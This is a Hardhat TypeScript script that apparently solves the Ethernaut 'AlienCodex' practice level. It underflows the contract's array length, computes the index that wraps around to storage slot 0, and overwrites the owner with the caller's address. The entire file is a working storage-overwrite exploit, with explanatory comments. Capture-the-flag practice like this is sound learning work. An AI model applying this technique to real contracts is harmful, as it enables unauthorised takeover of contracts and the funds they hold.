import { ethers } from "hardhat";
import { Address } from "hardhat-deploy/types";
import { AlienCodex } from "../typechain-types";

const delay = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));

const main = async () => {
    const [deployer] = await ethers.getSigners();
    const alienCodexAddress: Address = "0x25fBd7Ac6b754530a49F196d0447Fd3B5d4340cc";
    const alienCodex: AlienCodex = await ethers.getContractAt("AlienCodex", alienCodexAddress, deployer);

    // 📋 Fetch and display initial contract state
    console.log(`👽 Contract Owner (before changes): ${await alienCodex.owner()}`);
    console.log(`📡 Are we in contact with the aliens?? ${await alienCodex.contact()}`);

    // 📞 Making contact with the aliens
    await alienCodex.makeContact();
    await delay(5000);
    console.log(`🚀 Making contact...`);
    console.log(`📡 Are we in contact with the aliens now? ${await alienCodex.contact()}`);

    // 🔄 Retract to cause overflow in the array length. This exploits the vulnerability of the contract by manipulating storage directly.
    await alienCodex.retract();
    console.log(`🛰 Retracting...`);
    await delay(5000);
    
    // 🧮 Calculate the position of the first element in the array codex[0]
    // The keccak256 hash function is used here to compute the slot location. 
    const startSlotArray = ethers.utils.keccak256(ethers.utils.hexZeroPad("0x1", 32));
    const startSlotArrayInUint256 = ethers.BigNumber.from(startSlotArray);
    console.log(`📏 Start slot array in hex: ${startSlotArray}`);

    // 🔍 Determine the slot 0 of the contract within the array. This is where the owner's address is stored.
    // The logic behind this calculation is to understand how Ethereum storage works. 
    // The maximum value for a uint256 in Ethereum is 2^256 - 1, so to compute 2^256, we just add 1 to this maximum value.
    // We then subtract the starting slot of the array to find the specific storage slot that holds the owner's address.
    const ownerSlotInUint256 = ethers.constants.MaxUint256.add("1").sub(startSlotArrayInUint256);
    const ownerSlot = ethers.utils.hexlify(ownerSlotInUint256);
    console.log(`🧩 Owner slot array in hex: ${ownerSlot}`);
    console.log(`🧩 Owner slot array in uint256: ${ownerSlotInUint256}`);

    // 🔐 Check and display the slot of the codex. This provides a sanity check to ensure we've identified the correct slot.
    console.log(`🔎 Checking slot of owner in codex array: ${await alienCodex.codex(ownerSlotInUint256)}`);

    // 📦 Package the necessary data for contact and the deployer's address.
    // This essentially combines two pieces of information into one 32-byte word to be stored in the slot we identified.
    const data = ethers.utils.hexConcat([ethers.utils.hexlify(1), await deployer.getAddress()]);
    const payload = ethers.utils.hexZeroPad(data, 32);

    // 🔄 Modify the values in storage to effectively change the contract's state, exploiting its vulnerability.
    await alienCodex.revise(ownerSlotInUint256, payload);
    await delay(5000);

    // 📋 Fetch and display updated contract state, showing the effects of our manipulation.
    console.log(`👽 Contract Owner (after changes): ${await alienCodex.owner()}`);
}

main().catch(error => {
  console.error('🚫 An error occurred:', error);
});
